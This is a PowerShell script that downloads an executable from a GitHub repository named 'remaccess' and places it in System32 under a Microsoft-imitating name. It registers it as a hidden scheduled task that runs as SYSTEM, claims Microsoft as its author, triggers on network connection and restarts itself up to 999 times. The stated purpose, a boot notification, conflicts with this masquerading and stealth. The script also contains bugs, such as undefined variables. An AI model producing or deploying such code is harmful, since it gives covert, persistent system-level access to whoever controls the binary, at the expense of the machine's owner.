#This script creates a schedule task that will run everytime the system is booted up.
#Purpose of this scirpt to get notified once a system comes online.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
$filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotSimple.exe"
$pingdaemontask = "Windows Update Service Daemon"
#Purge of Ping Task
$Name = "Deleteing the Ping Task and Related Files"
$prompt = Read-Host "Proceed With $Name (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
} else {}
# Removal of directories
foreach ($file in $filepath) {
    if (Test-Path $file -PathType Leaf) {
        Remove-Item -Path $file -Force
    } else {}
}} else {}
#Creation of the setup
$Name = "Creating a schedule task for Pinging"
$prompt = Read-Host "Proceed With $Name (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
if (-not (Test-Path (Split-Path $localFilePath))) {
    New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
}
if (Test-Path -Path $localFilePath -PathType Leaf) {
    Remove-Item -Path $localFilePath -Force
}
try {
    Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
} catch {}
#Create Windows Scheduled task
$pingdaemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-15T12:03:06.3532289</Date>
    <Author>Microsoft\System</Author>
    <URI>\Windows Update Service Daemon</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe</Command>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
} else {}
Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
Start-ScheduledTask -TaskName $pingdaemontask
} else {}
